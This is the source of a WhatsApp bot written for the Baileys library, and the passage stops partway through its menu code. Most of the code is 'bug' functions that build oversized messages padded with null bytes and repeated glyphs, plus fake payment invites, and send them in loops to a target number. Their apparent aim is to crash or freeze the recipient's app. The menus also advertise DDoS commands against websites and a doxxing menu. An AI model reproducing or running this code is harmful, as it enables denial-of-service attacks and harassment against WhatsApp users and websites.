require('./settings')
require('./lib/language')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket } = global.baileys1
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const latensi = speed() - timestampp
const pino = require('pino')
const moment = require('moment-timezone')
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('./lib/storage')
const { JSDOM } = require('jsdom')
module.exports = dimzzxoffc = async (dimzzxoffc, m, chatUpdate, store) => {
try {
var body = (m.mtype === 'conversation') ? m.message.conversation: (m.mtype == 'imageMessage') ? m.message.imageMessage.caption: (m.mtype == 'videoMessage') ? m.message.videoMessage.caption: (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text: (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId: (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId: (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId: (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text): ''
var budy = (typeof m.text == 'string' ? m.text: '')
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const owner = JSON.parse(fs.readFileSync('./lib/user.json'))
const isCmd = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const botNumber = await dimzzxoffc.decodeJid(dimzzxoffc.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const qtext = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await dimzzxoffc.groupMetadata(from).catch(e => {}) : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const pushname = m.pushName || "No Name"
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const imagevirtex = fs.readFileSync('./lib/image/imagevirtex.jpg')
const mime = (quoted.msg || quoted).mimetype || ''
const { uptotelegra } = require('./lib/upload')
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const slayer07 = fs.readFileSync('./lib/image/slayer07.jpg')
const ytdl = require("ytdl-core")
const bugthumb = fs.readFileSync ('./lib/image/hytam.jpg')
const virgamimage = fs.readFileSync ('./lib/image/virgam.jpg')


// Hahahaha
if (!dimzzxoffc.public) {
if (!isCreator) return
}

if (command) {
console.log(`User: ${pushname}\n Chat: ${command}\n Time: ${time}`)
}

let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
dimzzxoffc.sendPresenceUpdate(jd, from)
}

async function loading () {
var dimzzxoffcloading = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"Loading Selesai..."
]
let { key } = await dimzzxoffc.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})
for (let i = 0; i < dimzzxoffcloading.length; i++) {
await dimzzxoffc.sendMessage(from, {text: dimzzxoffcloading[i], edit: key });
}
}

// Function Penting

const FileSize = (number) => {
var SI_POSTFIXES = ["B", " KB", " MB", " GB", " TB", " PB", " EB"]
var tier = Math.log10(Math.abs(number)) / 3 | 0
if(tier == 0) return number
var postfix = SI_POSTFIXES[tier]
var scale = Math.pow(10, tier * 3)
var scaled = number / scale
var formatted = scaled.toFixed(1) + ''
if (/\.0$/.test(formatted))
formatted = formatted.substr(0, formatted.length - 2)
return formatted + postfix
}

dimzzxoffc.sendButton = async (jid, buttons, quoted, opts = {}) => {
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
                  body: {
                     text: opts && opts.body ? opts.body : ''
                  },
                  footer: {
                     text: opts && opts.footer ? opts.footer : ''
                  },
                  nativeFlowMessage: {
                     buttons: buttons,
                     messageParamsJson: ''
                  }
               }
            }
         }
      }, {
         quoted
      })
      await dimzzxoffc.sendPresenceUpdate('composing', jid)
      return dimzzxoffc.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }

// batas

function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 15;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

// Function Bug

const bugquoted = {
      'key': {
        'fromMe': false,
        'participant': "0@s.whatsapp.net",
        'remoteJid': 'status@broadcast'
      },
      'message': {
        'extendedTextMessage': {
          'text': '*VIRDARK-BOT*'
        }
      }
    };
const sendReact = async (emote) => {
        dimzzxoffc.sendMessage(remoteJid, {
          react: {
            text: emote,
            key: message.key,
          },
        })
      }

    function sendMessageWithMentions(text, mentions = [], quotedMessage) {
    if (quotedMessage == null || quotedMessage == undefined || quotedMessage == false) {
        return dimzzxoffc.sendMessage(
            remoteJid,
            {
                text: text,
                mentions: mentions,
            },
            { quoted: message }
        );
    } else {
        return dimzzxoffc.sendMessage(
            remoteJid,
            {
                text: text,
                mentions: mentions,
            },
            { quoted: message }
        );
    }
}
function sendMessageWithMentionsAlt(text, mentions = [], quotedMessage) {
    if (quotedMessage == null || quotedMessage == undefined || quotedMessage == false) {
        return dimzzxoffc.sendMessage(
            remoteJid,
            {
                text: text,
                mentions: mentions,
            },
            { quoted: message }
        );
    } else {
        return dimzzxoffc.sendMessage(
            remoteJid,
            {
                text: text,
                mentions: mentions,
            },
            { quoted: message }
        );
    }
}
    async function sendLiveLocationMessage(userJid) {
    const messageContent = generateWAMessageFromContent(
        userJid,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 'p',
                        degreesLongitude: 'p',
                        caption: 'S⃟K⃟Y⃟Z⃟ D⃟E⃟V⃟E⃟L⃟O⃟P⃟E⃟R⃟ W⃟H⃟A⃟T⃟S⃟A⃟P⃟P⃟'.repeat(55000),
                        sequenceNumber: '0',
                        jpegThumbnail: '',
                    },
                },
            },
        }),
        { userJid: userJid }
    );
    await dimzzxoffc.relayMessage(userJid, messageContent.message, {
        participant: { jid: userJid },
        messageId: messageContent.key.id,
    });
}
async function sendListMessage(userJid) {
    const messageContent = generateWAMessageFromContent(
        userJid,
        proto.Message.fromObject({
            listMessage: {
                title: 'S⃟K⃟Y⃟Z⃟ D⃟E⃟V⃟E⃟L⃟O⃟P⃟E⃟R⃟ W⃟H⃟A⃟T⃟S⃟A⃟P⃟P⃟ 𝕭𝖚𝖌'+'\0'.repeat(999999),
                footerText: '.',
                description: '.',
                buttonText: null,
                listType: 2,
                productListInfo: {
                    productSections: [
                        {
                            title: 'anjay',
                            products: [{ productId: '4392524570816732' }],
                        },
                    ],
                    productListHeaderImage: {
                        productId: '4392524570816732',
                        jpegThumbnail: null,
                    },
                    businessOwnerJid: '0@s.whatsapp.net',
                },
            },
            footer: 'puki',
            contextInfo: {
                expiration: 604800,
                ephemeralSettingTimestamp: '1679959486',
                entryPointConversionSource: 'global_search_new_chat',
                entryPointConversionApp: 'whatsapp',
                entryPointConversionDelaySeconds: 9,
                disappearingMode: { initiator: 'INITIATED_BY_ME' },
            },
            selectListType: 2,
            product_header_info: {
                product_header_info_id: 292928282928,
                product_header_is_rejected: true,
            },
        }),
        { userJid: userJid }
    );
    await dimzzxoffc.relayMessage(userJid, messageContent.message, {
        participant: { jid: userJid },
        messageId: messageContent.key.id,
    });
}

async function sendViewOnceMessageWithCaption(userJid) {
    const messageContent = generateWAMessageFromContent(
        userJid,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 'p',
                        degreesLongitude: 'p',
                        caption: '"؂𝕭𝖚𝖌 W⃟H⃟A⃟T⃟S⃟A⃟P⃟P⃟'.repeat(5000),
                        sequenceNumber: '0',
                        jpegThumbnail: '',
                    },
                },
            },
        }),
        { userJid: userJid }
    );
    await dimzzxoffc.relayMessage(userJid, messageContent.message, {
        participant: { jid: userJid },
        messageId: messageContent.key.id,
    });
}

async function sendListMessageBug(recipientJid) {
  const messageContent = generateWAMessageFromContent(
    recipientJid,
    proto.Message.fromObject({
      listMessage: {
        title: 'S⃟K⃟Y⃟Z⃟ D⃟E⃟V⃟E⃟L⃟O⃟P⃟E⃟R⃟ W⃟H⃟A⃟T⃟S⃟A⃟P⃟P⃟ 𝕭𝖚𝖌ÃŒ¸' + '\0'.repeat(920000), 
        footerText: 'ÃS⃟K⃟Y⃟Z⃟ D⃟E⃟V⃟E⃟L⃟O⃟P⃟E⃟R⃟ W⃟H⃟A⃟T⃟S⃟A⃟P⃟P⃟ 𝕭𝖚𝖌¸Ã¢•®',
        description: 'Ã S⃟K⃟Y⃟Z⃟ D⃟E⃟V⃟E⃟L⃟O⃟P⃟E⃟R⃟ W⃟H⃟A⃟T⃟S⃟A⃟P⃟P⃟ 𝕭𝖚𝖌¢Æ’Å¸Ã¢•®',
        buttonText: null,
        listType: 2,
        productListInfo: {
          productSections: [
            {
              title: 'pek',
              products: [{ productId: '4392524570816732' }],
            },
          ],
          productListHeaderImage: {
            productId: '4392524570816732',
            jpegThumbnail: null,
          },
          businessOwnerJid: '0@s.whatsapp.net',
        },
      },
      footer: 'pek',
      contextInfo: {
        expiration: 600000,
        ephemeralSettingTimestamp: '1679959486',
        entryPointConversionSource: 'global_search_new_chat',
        entryPointConversionApp: 'whatsapp',
        entryPointConversionDelaySeconds: 9,
        disappearingMode: { initiator: 'INITIATED_BY_ME' },
      },
      selectListType: 2,
      product_header_info: {
        product_header_info_id: 292928282928,
        product_header_is_rejected: false,
      },
    }),
    { userJid: recipientJid }
  );

  await dimzzxoffc.relayMessage(recipientJid, messageContent.message, {
    participant: { jid: recipientJid },
    messageId: messageContent.key.id,
  });
}

    async function buttonbug(target) {
      var npc = generateWAMessageFromContent(target, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'title': 'S⃟K⃟Y⃟Z⃟ D⃟E⃟V⃟E⃟L⃟O⃟P⃟E⃟R⃟ W⃟H⃟A⃟T⃟S⃟A⃟P⃟P⃟',
                'subtitle': " "
              },
              'body': {
                'text': " S⃟K⃟Y⃟Z⃟ D⃟E⃟V⃟E⃟L⃟O⃟P⃟E⃟R⃟ W⃟H⃟A⃟T⃟S⃟A⃟P⃟P⃟͢"
              },
              'footer': {
                'text': "›SKYZOFFICIAL"
              },
              'nativeFlowMessage': {
                'buttons': [{
                  'name': 'cta_url',
                  'buttonParamsJson': "{ display_text : 'S⃟K⃟Y⃟Z⃟ D⃟E⃟V⃟E⃟L⃟O⃟P⃟E⃟R⃟ W⃟H⃟A⃟T⃟S⃟A⃟P⃟P⃟', url : , merchant_url :  }"
                }],
                'messageParamsJson': "\0".repeat(1000000)
              },
              'liveLocationMessage': {
              'degreesLatitude': '⃟p⃟',
              'degreesLongitude': '⃟p⃟',
              'caption': "⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟" + 'ꦾ'.repeat(50000),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
             }
            }
          }
        }
}), { userJid: target, quoted: bugquoted });
await dimzzxoffc.relayMessage(target, npc.message, { participant: { jid: target }, messageId: npc.key.id });
}

    async function skyzbugproto(target) {
      let npc = generateWAMessageFromContent(target, {
        'viewOnceMessage': {
          'message': {
            'messageContextInfo': {
              'deviceListMetadata': {},
              'deviceListMetadataVersion': 2
            },
            'interactiveMessage': proto.Message.InteractiveMessage.create({
              'body': proto.Message.InteractiveMessage.Body.create({
                'text': ''
              }),
              'footer': proto.Message.InteractiveMessage.Footer.create({
                'text': 'ꦾ'.repeat(230000)
              }),
              'header': proto.Message.InteractiveMessage.Header.create({
                'title': '',
                'subtitle': '',
                'hasMediaAttachment': false
              }),
              'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                'buttons': [{
                  'name': 'cta_url',
                  'buttonParamsJson': "{ display_text : \" \", url : , merchant_url : \" \"}"
                }],
                'messageParamsJson': "\0".repeat(100000)
              })
            })
          }
        }
      }, {});
      dimzzxoffc.relayMessage(target, npc.message, {
        'participant': {
          'jid': target
        },
        'messageId': npc.key.id
      });
    }
    async function ceritanyabug(target) {
      var npc = generateWAMessageFromContent(target, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'title': '',
                'subtitle': "𝖂𝖍𝖆𝖙𝖘𝖆𝖕𝖕"
              },
              'body': {
                'text': "𝕭𝖚𝖌"
              },
              'footer': {
                'text': "𝖂𝖍𝖆𝖙𝖘𝖆𝖕𝖕"
              },
              'nativeFlowMessage': {
                'buttons': [{
                  'name': "cta_url",
                  'buttonParamsJson': "{ display_text : '⃟𝕭𝖚𝖌⃟', url : , merchant_url :  }"
                }, {
                  'name': 'cta_url',
                  'buttonParamsJson': "{ display_text : '⃟𝕭𝖚𝖌⃟', url : , merchant_url :  }"
                }, {
                  'name': 'cta_url',
                  'buttonParamsJson': "{ display_text : '⃟𝕭𝖚𝖌⃟', url : , merchant_url :  }"
                }],
                'messageParamsJson': ''.repeat(1000000)
              }
            }
          }
        }
      }), {
        'userJid': target,
        'quoted': bugquoted
      });
      await dimzzxoffc.relayMessage(target, npc.message, {
        'participant': {
          'jid': target
        },
        'messageId': npc.key.id
      });
    }

async function sendInteractiveListMessage(userJid) {
    const messageContent = generateWAMessageFromContent(
        userJid,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: '',
                            subtitle: '𝖂𝖍𝖆𝖙𝖘𝖆𝖕𝖕',
                        },
                        body: {
                            text: '𝖂𝖍𝖆𝖙𝖘𝖆𝖕𝖕',
                        },
                        footer: {
                            text: '𝖂𝖍𝖆𝖙𝖘𝖆𝖕𝖕',
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: 'cta_url',
                                    buttonParamsJson: "{ display_text : '𝕭𝖚𝖌', url : , merchant_url :  }",
                                },
                                {
                                    name: 'cta_url',
                      buttonParamsJson:
                        "{ display_text : '𝕭𝖚𝖌', url : , merchant_url :  }",
                    },
                    {
                      name: 'cta_url',
                      buttonParamsJson:
                        "{ display_text : '𝕭𝖚𝖌', url : , merchant_url :  }",
                                },
                            ],
                            messageParamsJson: ''.repeat(9999999),
                        },
                    },
                },
            },
        }),
        { userJid: userJid }
    );
    await dimzzxoffc.relayMessage(userJid, messageContent.message, {
        participant: { jid: userJid },
        messageId: messageContent.key.id,
    });
}

async function sendInteractiveMessageWithHeader(userJid) {
    const messageContent = generateWAMessageFromContent(
        userJid,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: '',
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: 'S⃟K⃟Y⃟Z⃟ D⃟E⃟V⃟E⃟L⃟O⃟P⃟E⃟R⃟ W⃟H⃟A⃟T⃟S⃟A⃟P⃟P⃟ 𝕭𝖚𝖌'.repeat(250000),
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            title: '',
                            subtitle: '',
                            hasMediaAttachment: false,
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                {
                                    name: 'cta_url',
                                    buttonParamsJson:
                          '{ display_text : " ", url : , merchant_url : " "}',
                                },
                            ],
                            messageParamsJson: '\0'.repeat(100000),
                        }),
                    }),
                },
            },
        }),
        {}
    );
    await dimzzxoffc.relayMessage(userJid, messageContent.message, {
        messageId: messageContent.key.id,
    });
}
async function sendInteractiveMessage(recipientJid) {
  let messageContent = generateWAMessageFromContent(
    recipientJid,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            body: proto.Message.InteractiveMessage.Body.create({
              text: '',
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: 'ê¦¾'.repeat(230000),
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              title: '',
              subtitle: '',
              hasMediaAttachment: false,
            }),
            nativeFlowMessage:
              proto.Message.InteractiveMessage.NativeFlowMessage.create({
                buttons: [
                  {
                    name: 'cta_url',
                    buttonParamsJson:
                      '{ display_text : " ", url : , merchant_url : " "}',
                  },
                ],
                messageParamsJson: '\0'.repeat(100000),
              }),
          }),
        },
      },
    },
    {}
  );
  await dimzzxoffc.relayMessage(recipientJid, messageContent.message, {
    participant: { jid: recipientJid },
    messageId: messageContent.key.id,
  });
}
async function sendLiveLocationMessageBug(recipientJid) {
    var liveLocationMessage = generateWAMessageFromContent(
        recipientJid,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 'p',
                        degreesLongitude: 'p',
                        caption:
                  `؂؂𝕭𝖚𝖌`+ 'ꦾ'.repeat(50000),
                        sequenceNumber: '0',
                        jpegThumbnail: '',
                    },
                },
            },
        }),
        { userJid: recipientJid }
    );
    await dimzzxoffc.relayMessage(recipientJid, liveLocationMessage.message, {
        participant: { jid: recipientJid },
        messageId: liveLocationMessage.key.id,
    });
}
async function sendInteractiveMessageV2(recipientJid) {
    var interactiveMessage = generateWAMessageFromContent(
        recipientJid,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: '',
                            subtitle: '',
                        },
                        body: { text: '' },
                        footer: { text: '' },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: 'cta_url',
                                    buttonParamsJson:
                        '{ display_text : " ", url : , merchant_url : " "}',
                                },
                            ],
                            messageParamsJson: '\0'.repeat(1000000),
                        },
                    },
                },
            },
        }),
        { userJid: recipientJid }
    );
    await dimzzxoffc.relayMessage(recipientJid, interactiveMessage.message, {
        participant: { jid: recipientJid },
        messageId: interactiveMessage.key.id,
    });
}

async function sendListMessageWithProductInfo(userJid) {
    const messageContent = generateWAMessageFromContent(
        userJid,
        proto.Message.fromObject({
            listMessage: {
                title:
              '؂؃؂𝕭𝖚𝖌 W⃟H⃟A⃟T⃟S⃟A⃟P⃟P⃟' + '\0'.repeat(920000),
                footerText: '',
                description: '',
                buttonText: null,
                listType: 2,
                productListInfo: {
                    productSections: [
                        {
                            title: 'anjay',
                            products: [{ productId: '4392524570816732' }],
                        },
                    ],
                    productListHeaderImage: {
                        productId: '4392524570816732',
                        jpegThumbnail: null,
                    },
                    businessOwnerJid: '0@s.whatsapp.net',
                },
            },
            footer: 'puki',
            contextInfo: {
                expiration: 604800,
                ephemeralSettingTimestamp: '1679959486',
                entryPointConversionSource: 'global_search_new_chat',
                entryPointConversionApp: 'whatsapp',
                entryPointConversionDelaySeconds: 9,
                disappearingMode: { initiator: 'INITIATED_BY_ME' },
            },
            selectListType: 2,
            product_header_info: {
                product_header_info_id: 292928282928,
                product_header_is_rejected: false,
            },
        }),
        { userJid: userJid }
    );
    await dimzzxoffc.relayMessage(userJid, messageContent.message, {
        participant: { jid: userJid },
        messageId: messageContent.key.id,
    });
}
    async function sendExtendedTextMessage(recipientJid) {
    var message = generateWAMessageFromContent(
        recipientJid,
        proto.Message.fromObject({
            extendedTextMessage: {
                text: '𝟾𝟙𝟗𝟞𝟨𝟚-𝟭𝟨𝟜𝟜',
                contextInfo: {
                    stanzaId: recipientJid,
                    participant: recipientJid,
                    quotedMessage: {
                        conversation: '؂ÙS⃟K⃟Y⃟Z⃟ D⃟E⃟V⃟E⃟L⃟O⃟P⃟E⃟R⃟ W⃟H⃟A⃟T⃟S⃟A⃟P⃟P⃟ 𝕭𝖚𝖌Ù½'.repeat(40000),
                    },
                    disappearingMode: {
                        initiator: 'CHANGED_IN_CHAT',
                        trigger: 'CHAT_SETTING',
                    },
                },
                inviteLinkGroupTypeV2: 'DEFAULT',
            },
        }),
        { userJid: recipientJid }
    );
    await dimzzxoffc.relayMessage(recipientJid, message.message, {
        participant: { jid: recipientJid },
        messageId: message.key.id,
    });
}

async function sendShortExtendedTextMessage(recipientJid) {
    await dimzzxoffc.relayMessage(
        recipientJid,
        {
            extendedTextMessage: {
                text: '.',
                contextInfo: {
                    stanzaId: recipientJid,
                    participant: recipientJid,
                    quotedMessage: { conversation: 'ê¦W⃟H⃟A⃟T⃟S⃟A⃟P⃟P⃟'.repeat(50000) },
                    disappearingMode: {
                        initiator: 'CHANGED_IN_CHAT',
                        trigger: 'CHAT_SETTING',
                    },
                },
                inviteLinkGroupTypeV2: 'DEFAULT',
            },
        },
        { participant: { jid: recipientJid } },
        { messageId: null }
    );
}

async function sendPaymentInviteUPI(recipientJid) {
    await dimzzxoffc.relayMessage(
        recipientJid,
        {
            paymentInviteMessage: {
                serviceType: 'UPI',
                expiryTimestamp: Date.now() + 86400000, // 1 day in milliseconds
            },
        },
        { participant: { jid: recipientJid } }
    );
}

async function sendPaymentInvite(recipientJid) {
    await dimzzxoffc.relayMessage(
        recipientJid,
        {
            paymentInviteMessage: {
                serviceType: 'TIMESTAMP',
                expiryTimestamp: Date.now() + 86400000000, // 1000 days in milliseconds
            },
        },
        { participant: { jid: recipientJid } }
    );
}

async function sendPaymentInviteskyzdev(recipientJid) {
    await dimzzxoffc.relayMessage(
        recipientJid,
        {
            paymentInviteMessage: {
                serviceType: 'SKYZDEV',
                expiryTimestamp: Date.now() + 99871266666, // 1000 days in milliseconds
            },
        },
        { participant: { jid: recipientJid } }
    );
}

async function sendPaymentInviteFBPAY(recipientJid) {
    await dimzzxoffc.relayMessage(
        recipientJid,
        {
            paymentInviteMessage: {
                serviceType: 'FBPAY',
                expiryTimestamp: Date.now() + 1814400000, // 21 days in milliseconds
            },
        },
        { participant: { jid: recipientJid } }
    );
}
async function bugxbutton (target, skyzquoted) {
for (let j = 0; j < skyzquoted; j++) {
ceritanyabug(target);
await sleep(2000)
sendInteractiveMessageV2(target);
await sleep(2000)
buttonbug(target);
await sleep(2000)
skyzbugproto(target);
}
}
async function sendMultiLocationMessages (target, skyzquoted) {
for (let j = 0; j < skyzquoted; j++) {
sendLiveLocationMessageBug(target);
await sleep(2000)
skyzbugproto(target);
await sleep(2000)
sendLiveLocationMessage(target);
}
}
    async function sendRepeatedMessages(recipientJid, repeatCount) {
    for (let i = 0; i < repeatCount; i++) {
        sendInteractiveMessageWithHeader(recipientJid);
        await sleep(2000)
        sendInteractiveMessageWithHeader(recipientJid);
        await sleep(2000)
        sendInteractiveMessageWithHeader(recipientJid);
    }
}
async function sendMultipleTypesOfMessages(recipientJid, repeatCount) {
    for (let i = 0; i < repeatCount; i++) {
        sendInteractiveMessageV2(recipientJid);
        sendListMessageWithProductInfo(recipientJid);
        sendListMessageBug(recipientJid);
        sendLiveLocationMessage(recipientJid);
        sendLiveLocationMessageBug(recipientJid);
        sendInteractiveListMessage(recipientJid);
    }
}
async function sendAlternatingMessages(recipientJid, repeatCount) {
    for (let i = 0; i < repeatCount; i++) {
        sendExtendedTextMessage(recipientJid);
        sendPaymentInvite(recipientJid);
        sendPaymentInviteskyzdev(recipientJid);
        sendExtendedTextMessage(recipientJid);
        sendPaymentInvite(recipientJid);
    }
}

// Batas 


const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const replyy = (teks) => {
return dimzzxoffc.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `dimzzxoffc DEVELOPER 🌛`,"body": `Hai ${pushname}`, "previewType": "PHOTO","thumbnail": imagevirtex,"sourceUrl": `https://youtube.com/@SkyzENZO`}}}, { quoted:m})} 

const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
ytdl(Link, { filter: 'audioonly' }).pipe(fs.createWriteStream(mp3File)).on('finish', async () => {
await dimzzxoffc.sendMessage(m.chat, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(`./${mp3File}`)
})
} catch (err) {
m.reply(`${err}`)
}
}

const dimzzxoffcbugnew = { 
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `dimzzxoffc Official 💸`
}
}
}

// Komen
switch(command) {
// MENU
case 'menu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'DIMZZX','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY DIMZZX','description':'SkyzOfficial','id':'.bugmenu'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://www.youtube.com/@SkyzENZO",
      merchant_url: "https://www.youtube.com/@SkyzENZO"
   })
}
]
ewe = `╭──「 INFO BOTZ  ]─⊱
│⍨ Botz Name : BUGBOT
│⍨ Creator : HUNTER
│⍨ Telegram : @Admin
│⍨ Version : V1.1.17
│⍨ Prefix : Multi-Prefix
bot ni ya hunter contact him ndyo hii number yake +254722695736
╰────────────⊱

╭──「 *THIS MENU* ]─⊱
│⍨ self
│⍨ public
│⍨ setppbot
│⍨ groupmenu
│⍨ bugmenu
│⍨ soundmenu
│⍨ ownermenu
│⍨ panelmenu
│⍨ tempbanmenu
│⍨ ddosmenu
│⍨ downloadmenu
│⍨ doxxmenu
╰────────────⊱`
dimzzxoffc.sendButton(from,  hohe, m, {
body: ewe,
footer: `Powered by hunter`
})
break
case 'panelmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'DIMZZX','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY DIMZZX','description':'SkyzOfficial','id':'.bugmenu'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://www.youtube.com/@SkyzENZO",
      merchant_url: "https://www.youtube.com/@SkyzENZO"
   })
}
]
ewe = `╭──「 INFO BOTZ  ]─⊱
│⍨ Botz Name : BUGBOT
│⍨ Creator : HUNTER
│⍨ Telegram : @Admin
│⍨ Version : V1.1.17
│⍨ Prefix : Multi-Prefix
bot ni ya hunter contact him ndyo hii number yake +254722695736
╰────────────⊱

╭──「 *THIS MENU* ]─⊱
│⍨ hapuspanel *idserver*
│⍨ admin *username*
│⍨ deladmin *idserver*
│⍨ listadmin
│⍨ cpanel/buatpanel *nama*
│⍨ listserver
╰────────────⊱`
dimzzxoffc.sendButton(from,  hohe, m, {
body: ewe,
footer: `dimzzxoffc`
})
break
case 'ddosmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'DIMZZX','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY DIMZZX','description':'SkyzOfficial','id':'.bugmenu'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://www.youtube.com/@SkyzENZO",
      merchant_url: "https://www.youtube.com/@SkyzENZO"
   })
}
]
ewe = `╭──「 INFO BOTZ  ]─⊱
│⍨ Botz Name : BUGBOT
│⍨ Creator : HUNTER
│⍨ Telegram : @Admin
│⍨ Version : V1.1.17
│⍨ Prefix : Multi-Prefix
bot ni ya hunter contact him ndyo hii number yake +254722695736
╰────────────⊱

╭──「 *THIS MENU* ]─⊱
│⍨ ddos *<website> <duration>*
│⍨ chromev4 *<website> <duration>*
│⍨ tls-vip *<website> <duration>*
│⍨ browser *<website> <duration>*
╰────────────⊱`
dimzzxoffc.sendButton(from,  hohe, m, {
body: ewe,
footer: `Powered by DimzzX`
})
break
case 'doxxmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'DIMZZX','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY DIMZZX','description':'SkyzOfficial','id':'.bugmenu'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://www.youtube.com/@SkyzENZO",
      merchant_url: "https://www.youtube.com/@SkyzENZO"
   })
}
]
ewe = `╭──「 INFO BOTZ  ]─⊱
│⍨ Botz Name : BUGBOT
│⍨ Creator : HUNTER
│⍨ Telegram : @Admin
│⍨ Version : V1.1.17
│⍨ Prefix : Multi-Prefix
